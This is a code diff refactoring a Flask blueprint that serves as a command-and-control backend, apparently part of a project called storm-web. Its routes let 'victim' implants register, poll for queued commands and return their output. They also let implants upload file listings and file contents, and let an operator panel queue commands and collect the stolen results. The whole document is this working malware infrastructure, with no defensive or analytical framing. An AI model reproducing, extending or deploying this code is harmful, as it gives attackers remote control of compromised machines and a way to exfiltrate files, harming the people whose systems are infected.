@@ -2,8 +2,9 @@
 
 Routes verbatim from storm-web/app.py:601-779 (lines moved at
 extraction time).  See app/blueprints/capture.py for the package
-documentation.  C2 state lives in app.state (dict identity preserved
-so admin GETs see what victim POSTs write).
+documentation.  Since P5.3, C2 session/queue state lives behind the
+shared ``app.state.STORE`` (StateStore, lock-guarded); response shapes
+are frozen and enforced by tests/char.
 """
 from __future__ import annotations
 
@@ -14,14 +15,7 @@ from flask import Blueprint, jsonify, request
 
 import database as db
 
-from app.state import (
-    C2_COMMANDS,
-    C2_DOWNLOADS,
-    C2_FILE_LISTS,
-    C2_RESPONSES,
-    C2_SESSIONS,
-    BASE_DIR,
-)
+from app.state import BASE_DIR, STORE
 
 
 bp = Blueprint("capture_c2", __name__,
@@ -40,20 +34,11 @@ def c2_register():
     if not uid:
         return jsonify({'error': 'No uid provided'}), 400
 
-    C2_SESSIONS[uid] = {
-        'last_seen': datetime.now().isoformat(),
-        'info': info,
-        'ip': request.remote_addr
-    }
+    # P5.3: session state lives behind the shared StateStore
+    STORE.c2_session_set(uid, info, request.remote_addr)
 
     # Persist so the client list survives a server restart
     db.save_c2_session(uid, info, request.remote_addr)
-
-    # Initialise queues if new
-    if uid not in C2_COMMANDS:
-        C2_COMMANDS[uid] = []
-    if uid not in C2_RESPONSES:
-        C2_RESPONSES[uid] = []
 
     return jsonify({'status': 'registered'})
 
@@ -66,13 +51,12 @@ def c2_poll():
     if not uid:
         return jsonify({'error': 'No uid provided'}), 400
 
-    if uid in C2_SESSIONS:
-        C2_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
+    STORE.c2_session_update_last_seen(uid)  # no-op when uid unknown (legacy)
 
     db.update_c2_last_seen(uid)
 
-    if uid in C2_COMMANDS and len(C2_COMMANDS[uid]) > 0:
-        cmd = C2_COMMANDS[uid].pop(0)
+    cmd = STORE.c2_command_dequeue(uid)
+    if cmd is not None:
         return jsonify({'command': cmd})
 
     return jsonify({'command': None})
@@ -87,16 +71,9 @@ def c2_response():
     if not uid:
         return jsonify({'error': 'No uid provided'}), 400
 
-    if uid in C2_SESSIONS:
-        C2_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
+    STORE.c2_session_update_last_seen(uid)
 
-    if uid not in C2_RESPONSES:
-        C2_RESPONSES[uid] = []
-
-    C2_RESPONSES[uid].append({
-        'timestamp': datetime.now().isoformat(),
-        'output': output
-    })
+    STORE.c2_response_append(uid, output, datetime.now().isoformat())
 
     return jsonify({'status': 'received'})
 
@@ -109,11 +86,9 @@ def c2_list_clients():
     active = []
     now = datetime.now()
 
-    for uid, db_session in db.get_all_c2_sessions().items():
-        if uid not in C2_SESSIONS:
-            C2_SESSIONS[uid] = db_session
+    STORE.c2_sessions_import(db.get_all_c2_sessions())
 
-    for uid, sess in C2_SESSIONS.items():
+    for uid, sess in STORE.c2_all_sessions().items():
         if not uid:
             continue
         try:
@@ -139,40 +114,32 @@ def c2_queue_command():
     uid = data.get('uid')
     cmd = data.get('cmd')
 
-    if uid not in C2_COMMANDS:
-        C2_COMMANDS[uid] = []
-
-    C2_COMMANDS[uid].append(cmd)
+    STORE.c2_command_enqueue(uid, cmd)
     return jsonify({'status': 'queued'})
 
 
 @bp.route('/api/c2/get_responses/<uid>')
 def c2_get_responses(uid):
-    if uid in C2_RESPONSES:
-        resps = C2_RESPONSES[uid]
-        C2_RESPONSES[uid] = []  # stream semantics
-        return jsonify({'responses': resps})
-    return jsonify({'responses': []})
+    # stream semantics: drain returns everything and empties the queue
+    return jsonify({'responses': STORE.c2_response_drain(uid)})
 
 
 # ---------------------------------------------------------------------------
 # File-manager endpoints (between victim implant and operator panel).
-# C2_FILE_LISTS / C2_DOWNLOADS now live in app.state.
+# C2_FILE_LISTS / C2_DOWNLOADS live behind app.state.STORE since P5.3.
 # ---------------------------------------------------------------------------
 @bp.route('/api/c2/get_file_list/<uid>')
 def c2_get_file_list(uid):
-    if uid in C2_FILE_LISTS:
-        file_data = C2_FILE_LISTS[uid]
-        del C2_FILE_LISTS[uid]
+    file_data = STORE.c2_file_list_drain(uid)
+    if file_data is not None:
         return jsonify(file_data)
     return jsonify({'files': None})
 
 
 @bp.route('/api/c2/get_download/<uid>')
 def c2_get_download(uid):
-    if uid in C2_DOWNLOADS:
-        file_data = C2_DOWNLOADS[uid]
-        del C2_DOWNLOADS[uid]
+    file_data = STORE.c2_download_drain(uid)
+    if file_data is not None:
         return jsonify(file_data)
     return jsonify({'file': None})
 
@@ -186,10 +153,7 @@ def c2_file_list_response():
     path = data.get('path')
 
     if uid:
-        C2_FILE_LISTS[uid] = {
-            'files': files,
-            'path': path
-        }
+        STORE.c2_file_list_set(uid, {'files': files, 'path': path})
 
     return jsonify({'status': 'received'})
 
@@ -203,11 +167,11 @@ def c2_file_download_response():
     filename = data.get('filename')
 
     if uid:
-        C2_DOWNLOADS[uid] = {
+        STORE.c2_download_set(uid, {
             'file': {
                 'content': content,
                 'filename': filename
             }
-        }
+        })
 
     return jsonify({'status': 'received'})
